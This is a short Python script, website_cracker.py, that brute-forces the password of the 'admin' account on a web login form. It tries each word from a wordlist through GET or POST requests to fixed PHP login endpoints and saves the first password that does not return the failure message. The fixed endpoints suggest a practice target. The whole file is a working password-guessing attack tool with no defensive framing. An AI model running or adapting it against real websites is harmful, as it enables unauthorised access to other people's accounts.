#! /usr/bin/env python3
import os

import requests
import sys
from urllib.parse import urlparse
from colorama import Fore

try:
    #Url read in as user input via command line
    url = sys.argv[1]
    #Wordlist read in as user input via command line
    wordlist = sys.argv[2]
    #Method read in as user input via command line
    method = sys.argv[3]
    #Output file read in as user input via command line
    outfile = sys.argv[4]

    #Failure message to check if login was unsuccessful
    failure = 'Wrong Username or Password'

    #Parse the URL to get the hostname
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname

    #Check if the method is valid
    valid_methods = ['get', 'GET', 'post', 'POST']

    #If method is not valid, print error message and exit
    if method not in valid_methods:
        print('Invalid method. Please use POST or GET')
        sys.exit(1)

    #Open the wordlist file
    with open(wordlist, 'r') as f:
        #Iterate through each line in the wordlist
        for line in f:
            password = line.strip()
            #If the method is GET, send a GET request to the URL with the username and password
            if method == 'get' or method == 'GET':
                response = requests.get('http://' + hostname + '/checkloginget.php?username=admin&password=' + password + '&Submit=Login')
            #If the method is POST, send a POST request to the URL with the username and password
            elif method == 'post' or method == 'POST':
                response = requests.post('http://' + hostname + '/checkloginpost.php', data = {'username':'admin', 'password':password, 'Submit':'Login'})
            #If the failure message is not in the response text, assume the login was successful and print the attempted  password in green
            if failure not in response.text:
                print(Fore.GREEN + password)

                #Write the URL, username, and password to the output file
                output = 'Url: ' + url + '\n' + 'Username: admin ' + '\n' + 'Password: ' + password

                with open(outfile, 'w') as outfile:
                    outfile.write(output)

                #Exit the program
                sys.exit(0)
            #If the failure message is in the response text, assume the login was unsuccessful and print the attempted password in red
            else:
                print(Fore.RED + password)
except IndexError:
    print('Usage: website_cracker.py <url> <wordlist> <method> (POST or GET) <outfile>')
    print('Example: website_cracker.py http://example.com wordlist.txt POST outfile.txt')
    sys.exit(1)
